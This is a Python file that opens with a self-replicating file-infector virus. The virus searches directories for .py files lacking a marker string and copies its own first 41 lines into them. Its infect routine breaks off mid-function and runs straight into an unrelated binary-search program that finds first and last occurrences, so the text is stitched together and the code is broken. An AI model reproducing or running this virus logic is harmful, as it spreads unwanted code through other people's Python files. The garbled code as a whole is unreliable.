#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to find first and
# last occurrences of a number in
# a given sorted array

# if x is present in arr[] then
# returns the index of FIRST
# occurrence of x in arr[0..n-1],
# otherwise returns -1


def first(arr, low, high, x, n):
	if(high >= low):
		mid = low + (high - low) // 2
		if((mid == 0 or x > arr[mid - 1]) and arr[mid] == x):
			return mid
		elif(x > arr[mid]):
			return first(arr, (mid + 1), high, x, n)
		else:
			return first(arr, low, (mid - 1), x, n)

	return -1


# if x is present in arr[] then
# returns the index of LAST occurrence
# of x in arr[0..n-1], otherwise
# returns -1
def last(arr, low, high, x, n):
	if (high >= low):
		mid = low + (high - low) // 2
		if ((mid == n - 1 or x < arr[mid + 1]) and arr[mid] == x):
			return mid
		elif (x < arr[mid]):
			return last(arr, low, (mid - 1), x, n)
		else:
			return last(arr, (mid + 1), high, x, n)

	return -1


# Driver program
arr = [1, 2, 2, 2, 2, 3, 4, 7, 8, 8]
n = len(arr)

x = 8
print("First Occurrence = ",
	first(arr, 0, n - 1, x, n))
print("Last Occurrence = ",
	last(arr, 0, n - 1, x, n))


# This code is contributed by Nikita Tiwari.
# Time Complexity: O(log(n))